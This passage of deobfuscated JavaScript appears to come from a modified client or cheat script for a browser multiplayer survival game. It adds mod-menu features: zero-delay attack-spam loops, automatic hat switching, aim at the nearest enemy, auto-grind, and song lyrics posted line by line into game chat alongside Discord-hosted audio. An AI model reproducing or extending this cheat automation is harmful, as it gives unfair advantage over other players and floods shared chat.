        var cA = y5.generateElement({class: "allianceItem", style: "color:" + (dp[cf] == yI.sid ? "#fff" : "rgba(255,255,255,0.6)"), text: dp[cf + 1], parent: VS});
        yI.isOwner && dp[cf] != yI.sid && y5.generateElement({class: "joinAlBtn", text: "Kick", onclick: function () {
          dF(dp[cf]);
        }, hookTouch: !0, parent: cA});
      }(cS); else if (yx.length) for (cS = 0; cS < yx.length; ++cS) !function (cf) {
        var cA = y5.generateElement({class: "allianceItem", style: "color:" + (yx[cf].sid == yI.team ? "#fff" : "rgba(255,255,255,0.6)"), text: yx[cf].sid, parent: VS});
        y5.generateElement({class: "joinAlBtn", text: "Join", onclick: function () {
          dZ(cf);
        }, hookTouch: !0, parent: cA});
      }(cS); else y5.generateElement({class: "allianceItem", text: "No Tribes Yet", parent: VS});
      y5.removeAllChildren(Vf), yI.team ? y5.generateElement({class: "allianceButtonM", style: "width: 360px", text: yI.isOwner ? "Delete Tribe" : "Leave Tribe", onclick: function () {
        dO();
      }, hookTouch: !0, parent: Vf}) : (y5.generateElement({tag: "input", type: "text", id: "allianceInput", maxLength: 7, placeholder: "unique name", ontouchstart: function (cf) {
        cf.preventDefault();
        var cA = prompt("unique name", cf.currentTarget.value);
        cf.currentTarget.value = cA.slice(0, 7);
      }, parent: Vf}), y5.generateElement({tag: "div", class: "allianceButtonM", style: "width: 140px;", text: "Create", onclick: function () {
        dz();
      }, hookTouch: !0, parent: Vf}));
    }
  }
  function dX(cS) {
    y4.send("11", ds[0].sid, cS), ds.splice(0, 1), dG();
  }
  function dF(cS) {
    y4.send("12", cS);
  }
  function dZ(cS) {
    y4.send("10", yx[cS].sid);
  }
  function dz() {
    y4.send("8", document.getElementById("allianceInput").value);
  }
  function dO() {
    ds = [], dp = [], dG(), y4.send("9");
  }
  var dE, dI = [];
  function dM(cS, cf) {
    for (var cA = 0; cA < dI.length; ++cA) if (!dI[cA].active) {
      dE = dI[cA];
      break;
    }
    dE || (dE = new function () {
      this.init = function (cY, cb) {
        this.scale = 0, this.x = cY, this.y = cb, this.active = !0;
      }, this.update = function (cY, cb) {
        this.active && (this.scale += 0.05 * cb, this.scale >= y7.mapPingScale ? this.active = !1 : (cY.globalAlpha = 1 - Math.max(0, this.scale / y7.mapPingScale), cY.beginPath(), cY.arc(this.x / y7.mapScale * VA.width, this.y / y7.mapScale * VA.width, this.scale, 0, 2 * Math.PI), cY.stroke()));
      };
    }, dI.push(dE)), dE.init(cS, cf);
    if (yI.team && Ta == ![] && nearestEnemy.length && document.getElementById("syncteam").checked) {
      Ta = !![];
      db(53);
      JE(yI.weapons[1], !![]);
      dA.change(![]);
      dY.change(!![]);
      y4.send("7", 1);
      setTimeout(() => {
        y4.send("7", 1);
        Ta = ![];
        dA.change(![]);
        dY.change(![]);
      }, 250);
    }
  }
  function dK(cS) {
    dc = cS;
  }
  var dr = 0;
  function dw(cS, cf, cA) {
    cA ? cS ? yI.tailIndex = cf : yI.tails[cf] = 1 : cS ? yI.skinIndex = cf : yI.skins[cf] = 1, "block" == Vx.style.display && dR();
  }
  function dR() {
    if (yI) {
      y5.removeAllChildren(Vi);
      for (var cS = dr, cf = cS ? Vl : Vk, cA = 0; cA < cf.length; ++cA) cf[cA].dontSell || function (cY) {
        var cb = y5.generateElement({id: "storeDisplay" + cY, class: "storeItem", onmouseout: function () {
          dJ();
        }, onmouseover: function () {
          dJ(cf[cY], !1, !0);
        }, parent: Vi});
        y5.hookTouchEvents(cb, !0), y5.generateElement({tag: "img", class: "hatPreview", src: ".././img/" + (cS ? "accessories/access_" : "hats/hat_") + cf[cY].id + (cf[cY].topSprite ? "_p" : "") + ".png", parent: cb}), y5.generateElement({tag: "span", text: cf[cY].name, parent: cb}), (cS ? yI.tails[cf[cY].id] : yI.skins[cf[cY].id]) ? (cS ? yI.tailIndex : yI.skinIndex) == cf[cY].id ? y5.generateElement({class: "joinAlBtn", style: "margin-top: 5px", text: "Unequip", onclick: function () {
          db(0, cS);
        }, hookTouch: !0, parent: cb}) : y5.generateElement({class: "joinAlBtn", style: "margin-top: 5px", text: "Equip", onclick: function () {
          db(cf[cY].id, cS);
        }, hookTouch: !0, parent: cb}) : (y5.generateElement({class: "joinAlBtn", style: "margin-top: 5px", text: "Buy", onclick: function () {
          du(cf[cY].id, cS);
        }, hookTouch: !0, parent: cb}), y5.generateElement({tag: "span", class: "itemPrice", text: cf[cY].price, parent: cb}));
      }(cA);
    }
  }
  var dv = ![], dS = ![];
  var df = {status: ![], interval: null, change: function (cS) {
    if (cS == !![]) {
      clearInterval(this.interval);
      if (this.status == ![]) {
        y4.send("7", 1);
      }
      y4.send("c", 1, Tj);
      this.status = !![];
    } else {
      if (this.status == !![]) {
        y4.send("7", 1);
      }
      this.status = ![];
      y4.send("c", 0, Tj);
    }
  }};
  var dA = {interval: null, status: ![], change: function (cS) {
    if (cS == !![]) {
      clearInterval(this.interval);
      this.status = !![];
      JE(yI.weapons[0], !![]);
      this.interval = setInterval(() => {
        JE(yI.weapons[0], !![]);
        JE(yI.weapons[0], !![]);
      }, 0);
    } else {
      this.status = ![];
      clearInterval(this.interval);
    }
  }};
  var dY = {interval: null, status: ![], change: function (cS) {
    if (cS == !![]) {
      clearInterval(this.interval);
      this.status = !![];
      JE(yI.weapons[1], !![]);
      this.interval = setInterval(() => {
        JE(yI.weapons[1], !![]);
        JE(yI.weapons[1], !![]);
      }, 0);
    } else {
      this.status = ![];
      clearInterval(this.interval);
    }
  }};
  function db(cS, cf) {
    if (!cf) {
      if (dS == !![]) {
        y4.send("13c", 0, 22, 0);
      } else if (dv == !![] || TH == !![] || TQ == !![]) {
        y4.send("13c", 0, 6, 0);
      } else {
        y4.send("13c", 0, cS, 0);
        if (!yI.skins[cS] && cS > 0) y4.send("13c", 0, 0, 0);
      }
    } else {
      y4.send("13c", 0, cS, 1);
    }
  }
  function du(cS, cf) {
    y4.send("13c", 1, cS, cf);
  }
  function dx() {
    Vx.style.display = "none", Vv.style.display = "none", dj();
  }
  function dQ() {
    if (document.getElementById("doExternalVisuals").checked == !![]) {
      if (document.getElementById("visualType").value == 1) {
        document.getElementById("topInfoHolder").style.left = "20px";
        document.getElementById("resDisplay").appendChild(document.getElementById("killCounter"));
        document.getElementById("killCounter").style.bottom = "185px";
        document.getElementById("killCounter").style.right = "20px";
        Vd.style.left = "330px";
        VJ.style.left = "270px";
        document.getElementById("chatButton").style.right = "140px";
        document.getElementById("chatButton").style.display = "none";
        if (modMenu.style.display == "block") {
          document.getElementById("topInfoHolder").style.display = "none";
          Vd.style.display = "none";
          VJ.style.display = "none";
        }
        Vd.removeAttribute("id");
        VJ.removeAttribute("id");
      } else {
        document.getElementById("topInfoHolder").style.left = null;
        document.getElementById("topInfoHolder").appendChild(document.getElementById("killCounter"));
        document.getElementById("killCounter").style.bottom = null;
        document.getElementById("killCounter").style.right = null;
        document.getElementById("chatButton").style.right = null;
        document.getElementById("chatButton").style.display = "block";
        document.getElementById("topInfoHolder").style.display = "block";
        Vd.style.display = "block";
        VJ.style.display = "block";
        Vd.style.left = null;
        VJ.style.left = null;
        Vd.setAttribute("id", "allianceButton");
        VJ.setAttribute("id", "storeButton");
      }
      V2 = 1920;
      V3 = 1080;
      J3();
    } else {
      document.getElementById("topInfoHolder").style.left = null;
      document.getElementById("topInfoHolder").appendChild(document.getElementById("killCounter"));
      document.getElementById("killCounter").style.bottom = null;
      document.getElementById("killCounter").style.right = null;
      Vd.style.left = null;
      Vd.setAttribute("id", "allianceButton");
      document.getElementById("chatButton").style.right = null;
      document.getElementById("chatButton").style.display = "block";
      document.getElementById("topInfoHolder").style.display = "block";
      VJ.style.left = null;
      Vd.style.display = "block";
      VJ.style.display = "block";
      VJ.setAttribute("id", "storeButton");
      V2 = 1920 * 1.1;
      V3 = 1080 * 1.1;
      J3();
    }
  }
  document.getElementById("doExternalVisuals").addEventListener("change", cS => {
    dQ();
    dk();
  });
  document.getElementById("visualType").addEventListener("change", cS => {
    dQ();
    dk();
  });
  function dk(cS, cf) {
    cS && (cf ? yI.weapons = cS : yI.items = cS);
    for (var cA = 0; cA < y9.list.length; ++cA) {
      var cY = y9.weapons.length + cA;
      if (document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) {
        document.getElementById("actionBarItem" + cY).style.display = [0, 3, 6, 10].indexOf(y9.list[cA].id) >= 0 ? "inline-block" : "none";
      } else {
        document.getElementById("actionBarItem" + cY).style.display = yI.items.indexOf(y9.list[cA].id) >= 0 ? "inline-block" : "none";
      }
    }
    for (cA = 0; cA < y9.weapons.length; ++cA) document.getElementById("actionBarItem" + cA).style.display = yI.weapons[y9.weapons[cA].type] == y9.weapons[cA].id ? "inline-block" : "none";
  }
  function dl(cS) {
    yX = cS, yA = cS && window.devicePixelRatio || 1, Vp.checked = cS, yN("native_resolution", cS.toString()), J3();
  }
  function da() {
    for (var cS = "", cf = 0; cf < y7.skinColors.length; ++cf) cS += cf == V1 ? "<div class='skinColorItem activeSkin' style='background-color:" + y7.skinColors[cf] + "' onclick='selectSkinColor(" + cf + ")'></div>" : "<div class='skinColorItem' style='background-color:" + y7.skinColors[cf] + "' onclick='selectSkinColor(" + cf + ")'></div>";
    Vb.innerHTML = cS;
  }
  var dD = document.getElementById("chatBox"), dW = document.getElementById("chatHolder");
  function dm() {
    dC ? setTimeout(function () {
      var cS = prompt("chat message");
      cS && dB(cS);
    }, 1) : "block" == dW.style.display ? (dD.value && dB(dD.value), dj()) : (Vx.style.display = "none", Vv.style.display = "none", dW.style.display = "block", dD.focus(), Jd()), dD.value = "";
  }
  function dB(cS) {
    y4.send("ch", cS.slice(0, 30));
  }
  function dj() {
    dD.value = "", dW.style.display = "none";
  }
  var dC, J0, J1 = [];
  function J2(cS, cf) {
    var cA = cX(cS);
    cA && (cA.chatMessage = function (cY) {
      for (var cb, cu = 0; cu < J1.length; ++cu) if (cY.indexOf(J1[cu]) > -1) {
        cb = "";
        for (var cx = 0; cx < J1[cu].length; ++cx) cb += cb.length ? "o" : "M";
        var cQ = new RegExp(J1[cu], "g");
        cY = cY.replace(cQ, cb);
      }
      return cY;
    }(cf), cA.chatCountdown = y7.chatCountdown);
  }
  function J3() {
    yv = window.innerWidth, yS = window.innerHeight;
    var cS = Math.max(yv / V2, yS / V3) * yA;
    Vc.width = yv * yA, Vc.height = yS * yA, Vc.style.width = yv + "px", Vc.style.height = yS + "px", VL.setTransform(cS, 0, 0, cS, (yv * yA - V2 * cS) / 2, (yS * yA - V3 * cS) / 2);
  }
  function J4(cS) {
    (dC = cS) ? Vg.classList.add("touch") : Vg.classList.remove("touch");
  }
  function J5(cS) {
    cS.preventDefault(), cS.stopPropagation(), J4(!0);
    for (var cf = 0; cf < cS.changedTouches.length; cf++) {
      var cA = cS.changedTouches[cf];
      cA.identifier == yC.id ? (yC.id = -1, JZ()) : cA.identifier == V0.id && (V0.id = -1, yI.buildIndex >= 0 && (yE = 1), yE = 0);
    }
  }
  var J6 = {status: ![], interval: null, action: function (cS) {
    if (cS == !![]) {
      clearInterval(this.interval);
      this.interval = setInterval(() => {
        if (TD == ![] && Ta == ![] && Js.space == ![] && !document.getElementById("autogrind").checked) {
          c0 = "tankspam";
          let cf = yI.weapons[1] == 10 ? yI.weapons[1] : yI.weapons[0];
          JE(cf, !![]);
          if (cf == yI.weapons[1] ? yI.secondary.reload == 1 : yI.primary.reload == 1) {
            y4.send("c", 1, Number.MAX_VALUE);
            y4.send("c", 0, Number.MAX_VALUE);
            db(40);
          } else {
            if (cH() && yI.skins[7]) {
              Tf += 0.00900900901;
              db(7);
            } else if (cy.length && yI.skins[22]) {
              db(22);
              db(11, 1);
            } else {
              db(6);
              if (cX(nearestEnemy[0]) && cX(nearestEnemy[0]).primary.reload + 111 / y9.weapons[cX(nearestEnemy[0]).primary.id].speed >= 1 && cX(nearestEnemy[0]).primary.variant == 0) {
                db(21, 1);
              } else {
                db(11, 1);
              }
            }
          }
          y4.send("2", Number.MAX_VALUE);
        }
      }, 0);
    } else {
      clearInterval(this.interval);
    }
  }}, J7 = {status: ![], interval: null, action: function (cS) {
    if (cS == !![]) {
      clearInterval(this.interval);
      this.interval = setInterval(() => {
        if (TD == ![] && Ta == ![] && !document.getElementById("autogrind").checked && J6.status == ![]) {
          c0 = "bowspam";
          JE(yI.weapons[1], !![]);
          if (yI.secondary.reload == 1) {
            db(20);
            db(11, 1);
            y4.send("c", 1, Tj);
            y4.send("c", 0, Tj);
          } else {
            if (cH() && yI.skins[7]) {
              Tf += 0.00900900901;
              db(7);
            } else if (cy.length && yI.skins[22]) {
              db(22);
              db(11, 1);
            } else if (yI.y2 > 6850 && yI.y2 < 7550 && yI.skins[31]) {
              db(31);
              db(11, 1);
            } else if (nearestEnemy.length && cN(nearestEnemy, yI) < 250 && yI.skins[6]) {
              db(6);
              db(11, 1);
            } else if (yI.y2 < 2400 && yI.skins[15]) {
              db(15);
              db(11, 1);
            } else {
              db(12);
              db(11, 1);
            }
          }
          y4.send("2", Tj);
        }
      }, 0);
    } else {
      clearInterval(this.interval);
    }
  }};
  document.getElementById("gameCanvas").addEventListener("mousedown", cS => {
    if (cS.button == 0) {
      J6.status = !J6.status;
      J6.action(J6.status);
    } else if (cS.button == 2) {
      J7.status = !J7.status;
      J7.action(J7.status);
    }
  });
  var J8 = ![];
  function J9() {
    if (!yI) {
      J8 = ![];
      return 0;
    } else if (Ta == !![] || TW.aiming == "normal") {
      J8 = ![];
      return Tj;
    } else if (TW.aiming == "back") {
      J8 = ![];
      return Tj + Math.PI;
    } else if (TD == !![] && Js.space == ![]) {
      if (TC == Number.MAX_VALUE) {
        J8 = !![];
        return Number.MAX_VALUE;
      } else {
        J8 = ![];
        return TC;
      }
    } else if (J6.status == !![] || document.getElementById("autogrind").checked == !![]) {
      J8 = !![];
      return Number.MAX_VALUE;
    } else if (J7.status == !![] && nearestEnemy.length) {
      return Tj;
    } else if (c0 == "auto bull spam" || c0 == "oneticking" && yI.weapons[0] != 4) {
      J8 = ![];
      return Tj || Math.atan2(yj - yS / 2, yB - yv / 2);
    } else if (yI.secondary.reload < 1 && yI.weaponIndex > 9 && yI.weapons[1] == 15) {
      return cP;
    } else if (V0.id != -1) {
      J8 = ![];
      J0 = Math.atan2(V0.currentY - V0.startY, V0.currentX - V0.startX);
    } else if (!yI.lockDir && !dC) {
      J8 = ![];
      J0 = Math.atan2(yj - yS / 2, yB - yv / 2);
    }
    return y5.fixTo(J0 || 0, 2);
  }
  window.addEventListener("resize", y5.checkTrusted(J3)), J3(), J4(!1), window.setUsingTouch = J4, Vc.addEventListener("touchmove", y5.checkTrusted(function (cS) {
    cS.preventDefault(), cS.stopPropagation(), J4(!0);
    for (var cf = 0; cf < cS.changedTouches.length; cf++) {
      var cA = cS.changedTouches[cf];
      cA.identifier == yC.id ? (yC.currentX = cA.pageX, yC.currentY = cA.pageY, JZ()) : cA.identifier == V0.id && (V0.currentX = cA.pageX, V0.currentY = cA.pageY, yE = 1);
    }
  }), !1), Vc.addEventListener("touchstart", y5.checkTrusted(function (cS) {
    cS.preventDefault(), cS.stopPropagation(), J4(!0);
    for (var cf = 0; cf < cS.changedTouches.length; cf++) {
      var cA = cS.changedTouches[cf];
      cA.pageX < document.body.scrollWidth / 2 && -1 == yC.id ? (yC.id = cA.identifier, yC.startX = yC.currentX = cA.pageX, yC.startY = yC.currentY = cA.pageY, JZ()) : cA.pageX > document.body.scrollWidth / 2 && -1 == V0.id && (V0.id = cA.identifier, V0.startX = V0.currentX = cA.pageX, V0.startY = V0.currentY = cA.pageY, yI.buildIndex < 0 && (yE = 1));
    }
  }), !1), Vc.addEventListener("touchend", y5.checkTrusted(J5), !1), Vc.addEventListener("touchcancel", y5.checkTrusted(J5), !1), Vc.addEventListener("touchleave", y5.checkTrusted(J5), !1), Vc.addEventListener("mousemove", function (cS) {
    cS.preventDefault(), cS.stopPropagation(), J4(!1), yB = cS.clientX, yj = cS.clientY;
  }, !1), Vc.addEventListener("mousedown", function (cS) {
    J4(!1), 1 != yE && (yE = 1);
  }, !1), Vc.addEventListener("mouseup", function (cS) {
    J4(!1), 0 != yE && (yE = 0);
  }, !1);
  var Jy = {}, JV = {87: [0, -1], 38: [0, -1], 83: [0, 1], 40: [0, 1], 65: [-1, 0], 37: [-1, 0], 68: [1, 0], 39: [1, 0]};
  function Jd() {
    Jy = {}, y4.send("rmd");
  }
  function JJ() {
    return "block" != Vv.style.display && "block" != dW.style.display;
  }
  function JT() {
    yI && yI.alive && y4.send("c", yE, yI.buildIndex >= 0 ? J9() : null);
  }
  var Jc = [new Audio("https://cdn.discordapp.com/attachments/967213871267971072/1027416621318414406/8mb.video-Vf9-wfenD0dA.m4a"), new Audio("https://cdn.discordapp.com/attachments/967213871267971072/1027001423034065006/DR._LOVE___DONT_STAND_SO_CLOSED_INITIAL_D.mp3"), new Audio("https://cdn.discordapp.com/attachments/967213871267971072/1027051825871990845/YT2mp3.info_-_Imagine_Dragons_-_Warriors_Lyrics_320kbps.mp3"), new Audio("https://cdn.discordapp.com/attachments/967213871267971072/1027003301465706537/Ken_Blast_-_The_Top_Lyrics_Video_Eurobeat_Initial_D_REUPLOAD.mp3"), new Audio("https://cdn.discordapp.com/attachments/967213871267971072/1027421527722963044/Egzod_Maestro_Chives__Alaina_Cross_-_No_Rival_Official_Lyric_Video.mp3")];
  function JL(cS) {
    let cf = [];
    Jc[cS].play();
    if (cS == 0) {
      cf = [{chat: "We at the top again, now what?", delay: 16e3}, {chat: "Heavy lay the crown, but", delay: 18e3}, {chat: "Count us", delay: 2e4}, {chat: "Higher than the mountain", delay: 21e3}, {chat: "And we be up here", delay: 23e3}, {chat: "for the long run", delay: 24e3}, {chat: "Strap in for a long one", delay: 25e3}, {chat: "We got everybody on one", delay: 27e3}, {chat: "Now you're coming at the king", delay: 29e3}, {chat: "so you better not miss", delay: 31e3}, {chat: "And we only get stronger", delay: 33e3}, {chat: "With everthing I carry", delay: 36e3}, {chat: "up on my back", delay: 37e3}, {chat: "you should paint it up", delay: 39e3}, {chat: "you should paint it up", delay: 39e3}, {chat: "with a target", delay: 41e3}, {chat: "Why would you dare me to", delay: 46e3}, {chat: "do it again?", delay: 47e3}, {chat: "Come get your spoiler up ahead", delay: 5e4}, {chat: "We're taking over,", delay: 53e3}, {chat: "We're taking over", delay: 56e3}, {chat: "Look at you come at my name,", delay: 61e3}, {chat: "you 'oughta know by now,", delay: 63e3}, {chat: "That We're Taking Over,", delay: 66e3}, {chat: "We're Taking Over", delay: 69e3}, {chat: "Maybe you wonder what", delay: 74e3}, {chat: "you're futures gonna be, but", delay: 75e3}, {chat: "I got it all locked up", delay: 77e3}, {chat: "Take a lap, now", delay: 93e3}, {chat: "Don't be mad, now", delay: 95e3}, {chat: "Run it back, run it back,", delay: 97e3}, {chat: "run it back, now", delay: 98e3}, {chat: "I got bodies lining up,", delay: 1e5}, {chat: "think you're dreaming", delay: 101e3}, {chat: "of greatness", delay: 102e3}, {chat: "Send you back home,", delay: 103e3}, {chat: "let you wake up", delay: 105e3}, {chat: "Why would you dare me to", delay: 11e4}, {chat: "do it again?", delay: 111e3}, {chat: "Come get your spoiler up ahead", delay: 114e3}, {chat: "We're taking over,", delay: 117e3}, {chat: "We're taking over", delay: 12e4}, {chat: "Look at you come at my name,", delay: 125e3}, {chat: "you 'oughta know by now,", delay: 127e3}, {chat: "That We're Taking Over,", delay: 13e4}, {chat: "We're Taking Over", delay: 133e3}, {chat: "Maybe you wonder what", delay: 138e3}, {chat: "you're futures gonna be, but", delay: 14e4}, {chat: "I got it all locked up", delay: 141e3}, {chat: "After all, what still exists", delay: 157e3}, {chat: "except for fights", delay: 158e3}, {chat: "Around me,", delay: 16e4}, {chat: "the keyboard is clicking,", delay: 161e3}, {chat: "the clock is ticking", delay: 162e3}, {chat: "Still not enough, let me", delay: 164e3}, {chat: "protect your persistence", delay: 165e3}, {chat: "even if itâ€™s too late", delay: 167e3}, {chat: "Let out the fight,", delay: 168e3}, {chat: "right at this moment", delay: 169e3}, {chat: "I got the heart of lion", delay: 17e4}, {chat: "I know the higher you climbing", delay: 171e3}, {chat: "the harder you fall", delay: 172e3}, {chat: "I'm at the top of the mount", delay: 173e3}, {chat: "Too many bodies to count,", delay: 174e3}, {chat: "I've been through it all", delay: 175e3}, {chat: "I had to weather the storm", delay: 176e3}, {chat: "to get to level I'm on", delay: 178e3}, {chat: "That's how the legend was born", delay: 179e3}, {chat: "All of my enemies already dead", delay: 18e4}, {chat: "I'm bored, I'm ready for more", delay: 182e3}, {chat: "They know I'm ready for war", delay: 183e3}, {chat: "I told em", delay: 184e3}, {chat: "We're Taking Over,", delay: 185e3}, {chat: "We're Taking Over", delay: 186e3}, {chat: "Look at you come at my name,", delay: 192e3}, {chat: "you 'oughta know by now,", delay: 194e3}, {chat: "That We're Taking Over,", delay: 197e3}, {chat: "We're Taking Over", delay: 2e5}, {chat: "Maybe you wonder what", delay: 205e3}, {chat: "you're futures gonna be, but", delay: 206e3}, {chat: "I got it all locked up", delay: 208e3}];
    } else if (cS == 1) {
      cf = [{chat: "We'll be together", delay: 16428}, {chat: "'till the morning light", delay: 17431}, {chat: "Don't stand so", delay: 19430}, {chat: "Don't stand so", delay: 20537}, {chat: "Don't stand so close to me", delay: 22394}, {chat: "Baby you belong to me", delay: 37544}, {chat: "Yes you do, yes you do", delay: 40608}, {chat: "You're my affection", delay: 42118}, {chat: "I can make a woman cry", delay: 43959}, {chat: "Yes I do, yes I do", delay: 46846}, {chat: "I will be good", delay: 48323}, {chat: "You're like a cruel device", delay: 50330}, {chat: "your blood is cold like ice", delay: 51530}, {chat: "Posion for my veins", delay: 53126}, {chat: "I'm breaking my chains", delay: 54520}, {chat: "One look and you can kill", delay: 56534}, {chat: "my pain now is your thrill", delay: 58353}, {chat: "Your love is for me", delay: 60466}, {chat: "I say Try me", delay: 62135}, {chat: "take a chance on emotions", delay: 63844}, {chat: "For now and ever", delay: 65424}, {chat: "close to your heart", delay: 66521}, {chat: "I say Try me", delay: 68012}, {chat: "take a chance on my passion", delay: 69655}, {chat: "We'll be together all the time", delay: 71915}, {chat: "I say Try me", delay: 73862}, {chat: "take a chance on emotions", delay: 76381}, {chat: "For now and ever", delay: 77832}, {chat: "into my heart", delay: 79038}, {chat: "I say Try me", delay: 80568}, {chat: "take a chance on my passion", delay: 81941}, {chat: "We'll be together", delay: 83895}, {chat: "'till the morning light", delay: 85005}, {chat: "Don't stand so", delay: 87068}, {chat: "Don't stand so", delay: 88647}, {chat: "Don't stand so close to me", delay: 90090}, {chat: "Baby let me take control", delay: 106239}, {chat: "Yes I do, yes I do", delay: 108257}, {chat: "You are my target", delay: 110121}, {chat: "No one ever made me cry", delay: 111761}, {chat: "What you do, what you do", delay: 114535}, {chat: "Baby's so bad", delay: 116056}, {chat: "You're like a cruel device", delay: 118376}, {chat: "your blood is cold like ice", delay: 119797}, {chat: "Posion for my veins", delay: 121602}, {chat: "I'm breaking my chains", delay: 123250}, {chat: "One look and you can kill", delay: 124849}, {chat: "my pain now is your thrill", delay: 126381}, {chat: "Your love is for me", delay: 128096}, {chat: "I say Try me", delay: 129310}, {chat: "take a chance on emotions", delay: 131038}, {chat: "For now and ever", delay: 132844}, {chat: "close to your heart", delay: 134255}, {chat: "I say Try me", delay: 135932}, {chat: "take a chance on my passion", delay: 137255}, {chat: "We'll be together all the time", delay: 139257}, {chat: "I say Try me", delay: 141863}, {chat: "take a chance on emotions", delay: 143342}, {chat: "For now and ever into my heart", delay: 145433}, {chat: "I say Try me", delay: 148679}, {chat: "take a chance on my passion", delay: 150190}, {chat: "We'll be together", delay: 151716}, {chat: "'till the morning light", delay: 153966}, {chat: "Don't stand so", delay: 155878}, {chat: "Don't stand so", delay: 156935}, {chat: "Don't stand so close to me", delay: 158061}, {chat: "I say Try me", delay: 185081}, {chat: "take a chance on emotions", delay: 186492}, {chat: "For now and ever", delay: 188577}, {chat: "close to your heart", delay: 189819}, {chat: "I say Try me", delay: 191359}, {chat: "take a chance on my passion", delay: 193068}, {chat: "We'll be together all the time", delay: 194729}, {chat: "I say Try me", delay: 197008}, {chat: "take a chance on emotions", delay: 198865}, {chat: "For now and ever", delay: 200708}, {chat: "into my heart", delay: 201879}, {chat: "I say Try me", delay: 203396}, {chat: "take a chance on my passion", delay: 204804}, {chat: "We'll be together", delay: 206818}, {chat: "'till the morning light", delay: 208209}, {chat: "Don't stand so", delay: 210163}, {chat: "Don't stand so", delay: 211692}, {chat: "Don't stand so close to me", delay: 213290}, {chat: "Try me", delay: 228763}, {chat: "take a chance on emotions", delay: 229917}, {chat: "For now and ever", delay: 232175}, {chat: "close to your heart", delay: 233605}, {chat: "I say Try me", delay: 234494}, {chat: "take a chance on my passion", delay: 235826}, {chat: "We'll be together all the time", delay: 237819}, {chat: "I say Try me", delay: 240095}, {chat: "take a chance on emotions", delay: 241754}, {chat: "For now and ever", delay: 244041}, {chat: "into my heart", delay: 245137}, {chat: "I say Try me", delay: 246804}, {chat: "take a chance on my passion", delay: 248067}, {chat: "We'll be together", delay: 249872}, {chat: "'till the morning light", delay: 251107}, {chat: "Don't stand so", delay: 253246}, {chat: "Don't stand so", delay: 254803}, {chat: "Don't stand so close to me", delay: 256372}, {delay: 259025}, {delay: 260829}, {delay: 261174}];
    } else if (cS == 2) {
      cf = [{chat: "As a child you would wait", delay: 6e3}, {chat: "And watch from far away", delay: 9e3}, {chat: "But you always knew", delay: 12e3}, {chat: "that you'd be the one", delay: 14e3}, {chat: "That work while they all play", delay: 15e3}, {chat: "In youth you'd lay", delay: 18e3}, {chat: "Awake at night and scheme", delay: 21e3}, {chat: "Of all the things", delay: 24e3}, {chat: "that you would change", delay: 26e3}, {chat: "But it was just a dream", delay: 27e3}, {chat: "Here we are,", delay: 31e3}, {chat: "Don't turn away now", delay: 33e3}, {chat: "We are the warriors", delay: 37e3}, {chat: "that built this town", delay: 39e3}, {chat: "Here we are", delay: 43e3}, {chat: "Don't turn away now", delay: 45e3}, {chat: "We are the warriors", delay: 49e3}, {chat: "that built this town", delay: 51e3}, {chat: "from dust", delay: 55e3}, {chat: "The time will come", delay: 57e3}, {chat: "When you'll have to rise", delay: 58e3}, {chat: "above the best", delay: 61e3}, {chat: "and prove yourself", delay: 63e3}, {chat: "Your spirit never dies", delay: 64e3}, {chat: "Farewell, I've gone", delay: 67e3}, {chat: "to take my throne above", delay: 71e3}, {chat: "But don't weep for me", delay: 73e3}, {chat: "Cause this will be", delay: 75e3}, {chat: "The labor of my love", delay: 77e3}, {chat: "Here we are,", delay: 8e4}, {chat: "Don't turn away now", delay: 82e3}, {chat: "We are the warriors", delay: 86e3}, {chat: "that built this town", delay: 89e3}, {chat: "Here we are", delay: 92e3}, {chat: "Don't turn away now", delay: 94e3}, {chat: "We are the warriors", delay: 98e3}, {chat: "that built this town", delay: 101e3}, {chat: "from dust", delay: 104e3}, {chat: "Here we are,", delay: 129e3}, {chat: "Don't turn away now", delay: 132e3}, {chat: "We are the warriors", delay: 136e3}, {chat: "that built this town", delay: 132e3}, {chat: "Here we are", delay: 142e3}, {chat: "Don't turn away now", delay: 144e3}, {chat: "We are the warriors", delay: 148e3}, {chat: "that built this town", delay: 15e4}, {chat: "from dust", delay: 154e3}];
    } else if (cS == 3) {
      cf = [{chat: "Final lap", delay: 39e3}, {chat: "I'm on top of the world", delay: 4e4}, {chat: "And I will never", delay: 41e3}, {chat: "rest for second again!", delay: 42e3}, {chat: "One more time", delay: 45e3}, {chat: "I have beaten them out", delay: 46e3}, {chat: "The scent of gasoline", delay: 47e3}, {chat: "announces the end!", delay: 49e3}, {chat: "They all said", delay: 51e3}, {chat: "I'd best give it up", delay: 52e3}, {chat: "What a fool", delay: 53e3}, {chat: "to believe their lies!", delay: 54e3}, {chat: "Now they've fallen", delay: 57e3}, {chat: "and I'm at the top", delay: 58e3}, {chat: "Are you ready", delay: 59e3}, {chat: "now to die-ie-ie?!", delay: 6e4}, {chat: "I came up from the bottom,", delay: 63e3}, {chat: "and into the top", delay: 64e3}, {chat: "For the first time", delay: 65e3}, {chat: "I feel alive!", delay: 66e3}, {chat: "I can fly like an eagle,", delay: 69e3}, {chat: "and strike like a hawk!", delay: 7e4}, {chat: "Do you think you can survive", delay: 72e3}, {chat: "the top?", delay: 75e3}, {chat: "One more turn", delay: 87e3}, {chat: "and I'll settle the score", delay: 88e3}, {chat: "A rubber fire screams", delay: 89e3}, {chat: "into the night", delay: 91e3}, {chat: "Crash and burn is", delay: 93e3}, {chat: "what you're gonna do", delay: 94e3}, {chat: "I am a master of", delay: 95e3}, {chat: "the asphalt fight!", delay: 97e3}, {chat: "They all said", delay: 99e3}, {chat: "I'd best give it up", delay: 1e5}, {chat: "What a fool to", delay: 101e3}, {chat: "believe their lies!", delay: 104e3}, {chat: "Now they've fallen", delay: 105e3}, {chat: "and I'm at the top", delay: 106e3}, {chat: "Are you ready", delay: 107e3}, {chat: "now to die-ie-ie?!", delay: 108e3}, {chat: "I came up from the bottom,", delay: 11e4}, {chat: "and into the top", delay: 112e3}, {chat: "For the first time", delay: 113e3}, {chat: "I feel alive!", delay: 114e3}, {chat: "I can fly like an eagle,", delay: 117e3}, {chat: "and strike like a hawk!", delay: 118e3}, {chat: "Do you think you can survive", delay: 12e4}, {chat: "I came up from the bottom,", delay: 123e3}, {chat: "and into the top", delay: 124e3}, {chat: "For the first time", delay: 125e3}, {chat: "I feel alive!", delay: 126e3}, {chat: "I can fly like an eagle,", delay: 129e3}, {chat: "and strike like a hawk!", delay: 13e4}, {chat: "Do you think you can survive", delay: 131e3}, {chat: "the top?", delay: 134e3}, {chat: "I came up from the bottom,", delay: 171e3}, {chat: "and into the top", delay: 172e3}, 